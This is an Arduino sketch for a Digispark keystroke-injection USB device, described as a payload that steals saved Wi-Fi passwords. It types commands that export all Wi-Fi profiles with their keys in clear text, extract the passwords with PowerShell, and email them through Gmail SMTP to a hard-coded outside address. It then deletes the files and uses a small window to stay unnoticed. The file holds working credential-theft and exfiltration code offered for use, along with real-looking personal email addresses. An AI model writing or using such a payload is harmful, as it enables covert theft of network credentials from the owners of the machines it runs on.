/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook.
*/
#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("cmd"); //smallest cmd window possible for trying to making it as less noticeable as possible
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("cd %temp%")); //Jumping to temporary dir 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500); 
  DigiKeyboard.print(F("netsh wlan export profile key=clear")); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);  
  DigiKeyboard.print(F("powershell"));  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1200);
  DigiKeyboard.print(F("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt")); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);  
  DigiKeyboard.print(F("$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_GMAIL_NAME_HERE', 'YOUR_GMAIL_APP_PASSWORD_HERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'dominikefe2002@gmail.com'; $ReportEmail.To.Add('ali_efe0@outlook.com'); $ReportEmail.Subject = 'DigiSpark Report'; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add('Wi-Fi-PASS.txt'); $SMTPInfo.Send($ReportEmail)"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);                                                                                                                                                //enter example if your mail is example@gmail.com
  DigiKeyboard.delay(2000);  
  DigiKeyboard.print(F("exit")); //Jumping to temporary dir 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("exit")); //Jumping to temporary dir 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //start run
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(1500);
  DigiKeyboard.print(F("cd %temp%")); //Jumping to temporary dir 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500); 
  DigiKeyboard.print(F("del Wi-* /s /f /q")); //cleaning up all the mess
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);  
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);  
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  for(;;);
  
}
